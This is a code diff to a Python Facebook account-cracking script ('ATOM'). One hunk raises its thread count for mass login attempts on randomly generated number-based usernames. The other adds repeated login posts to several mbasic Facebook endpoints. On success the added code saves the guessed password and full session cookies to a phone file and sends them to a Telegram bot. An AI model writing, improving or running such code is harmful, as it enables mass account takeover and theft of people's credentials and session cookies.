@@ -913,7 +913,7 @@ def mix():
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
-  with tred(max_workers=20) as king_xd:
+  with tred(max_workers=70) as king_xd:
     os.system('clear')
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
@@ -1212,7 +1212,37 @@ def m4(idf,pwv):
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
    lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+   if 'c_user' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://graph.facebook.com/{user}/picture?type=normal"
+    reqx = requests.get(url).text
+    if 'Photoshop' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            ok+=1
+            break
+   lo = session.post('https://mbasic.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'm_page_voice' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://graph.facebook.com/{user}/picture?type=normal"
+    reqx = requests.get(url).text
+    if 'Photoshop' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            ok+=1
+            break
+   lo = session.post('https://mbasic.gamma.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'xs' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://graph.facebook.com/{user}/picture?type=normal"
